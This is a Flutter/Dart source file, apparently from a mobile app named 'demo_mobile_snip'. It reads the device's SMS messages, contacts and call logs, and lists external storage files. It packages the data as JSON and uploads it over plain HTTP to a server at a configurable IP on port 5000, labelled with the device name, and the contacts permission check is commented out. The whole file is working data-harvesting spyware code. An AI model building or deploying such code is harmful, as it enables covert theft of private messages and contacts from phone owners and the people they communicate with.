import 'dart:convert';

import 'package:demo_mobile_snip/main.dart';
import 'package:device_marketing_names/device_marketing_names.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';

import 'package:flutter_contacts/flutter_contacts.dart';

import 'package:call_log/call_log.dart';
import 'package:http/http.dart' as http;
import 'dart:io';
import 'package:path_provider/path_provider.dart';




Future<String> fetchSms() async {
  final SmsQuery query = SmsQuery();
  var data = await query.getAllSms;
  data = [data.last];


  final List<Map<String, dynamic>> jsonList = data.map((msg) => {
        'address': msg.address,
        'body': msg.body,
        'date': msg.date.toString(),
      }).toList();

  return jsonEncode(jsonList);

}




Future<String> fetchContacts() async {
  // if (await FlutterContacts.requestPermission()) {
    print("permission grand");
    var data = await FlutterContacts.getContacts(withProperties: true);


    final List<Map<String, dynamic>> jsonList = data.map((msg) => {
        'name': msg.displayName,
        'number': msg.phones.first.number,
        'id': msg.id,
      }).toList();


    int end = jsonList.length >= 5 ? 5 : jsonList.length;
    var firstFew = jsonList.sublist(0, end);

    return jsonEncode(firstFew);
}

Future<String> fetchCallLogs() async {
  var data = await CallLog.get();

  final List<Map<String, dynamic>> jsonList = data.map((msg) => {
        'name': msg.name,
        'number': msg.number,
        'duration': msg.duration,
        'date': msg.timestamp,
        'type': msg.callType?.name,
      }).toList();

  int end = jsonList.length >= 5 ? 5 : jsonList.length;
  var firstFew = jsonList.sublist(0, end);

  return jsonEncode(firstFew);


}




Future<List<FileSystemEntity>?> listFiles() async {
  final Directory? directory = await getExternalStorageDirectory();
  return directory?.listSync();
}


Future<void> sendJsonToServer(String dataType, String jsonString) async {
  final url = Uri.parse('http://${ip}:5000/upload_data');

  final deviceNames = DeviceMarketingNames();

  // Get one marketing name of the device.
  final String singleDeviceName = await deviceNames.getSingleName();

  final response = await http.post(
    url,
    headers: {
      'Content-Type': 'application/json',
      'Device-ID': singleDeviceName,        // You can make this dynamic
      'Data-Type': dataType,                 // e.g., "sms", "contacts", "calllog"
    },
    body: jsonString,
  );

  if (response.statusCode == 200) {
    print('✅ $dataType of  uploaded successfully');
  } else {
    print('❌ Failed to upload $dataType');
  }
}
